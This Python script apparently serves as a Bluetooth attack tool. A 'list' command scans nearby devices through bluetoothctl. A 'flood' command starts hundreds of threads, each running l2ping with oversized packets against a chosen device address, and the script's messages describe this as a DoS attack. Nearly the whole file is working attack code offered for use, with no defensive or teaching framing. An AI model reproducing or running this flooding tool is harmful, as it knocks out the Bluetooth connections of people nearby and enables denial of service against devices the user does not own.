import asyncio
import time
import re
import threading
import subprocess
import argparse

def list_bluetooth(wait_time):
    # Start bluetoothctl as a subprocess
    process = subprocess.Popen(
        ['bluetoothctl'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    # Issue the 'scan on' command to start scanning
    process.stdin.write("scan on\n")
    process.stdin.flush()

    # Wait for a few seconds to gather scan results
    print(f'Waiting {wait_time}s for advertisements')
    time.sleep(wait_time)

    # Stop the scan
    process.stdin.write("scan off\n")
    process.stdin.flush()

    process.stdin.write("devices\n")
    process.stdin.flush()

    # Capture output
    output, _ = process.communicate()

    # Parse the output for device addresses and names
    devices = []
    for line in output.splitlines():
        match = re.search(r"Device ([0-9A-F:]+)\s+([\w\s:-]+)", line)
        if match:
            address, name = match.groups()
            devices.append(f'{address} {name}')

    return devices


async def main():
    args = parse_args()

    if args.command == 'list':
        # lists bluetooth devices
        for dev in list_bluetooth(args.wait_time):
            print(f'{dev}')

    elif args.command == 'flood':
        for i in range(args.threads):
            print(f'[*] Thread {i}')
            threading.Thread(target=flood, args=(args.target, args.packet_size)).start()


def flood(target_addr, packet_size):
    print(f"Performing DoS attack on {target_addr} with packet size {packet_size}")
    subprocess.run(['l2ping', '-i', 'hci0', '-s', str(packet_size), target_addr])


def parse_args():
    parser = argparse.ArgumentParser(description="Script for Bluetooth scanning and DOS.")
    subparsers = parser.add_subparsers(dest='command')

    # list devices
    parser_list = subparsers.add_parser('list', help='List nearby devices')
    parser_list.add_argument('--wait-time', type=int, default=5, help='Number of seconds to wait when listening to advertisements (default: 5)')

    # flood devices
    parser_flood = subparsers.add_parser('flood', help='Flood target device')
    parser_flood.add_argument('target', type=str, help='Target Bluetooth address')
    parser.add_argument('--packet-size', type=int, default=600, help='Packet size (default: 600)')
    parser.add_argument('--threads', type=int, default=300, help='Number of threads (default: 300)')

    args = parser.parse_args()

    # Check if a subcommand was provided; if not, print help and exit
    if args.command is None:
        parser.print_help()
        exit(1)

    return args


if __name__ == '__main__':
    asyncio.run(main())

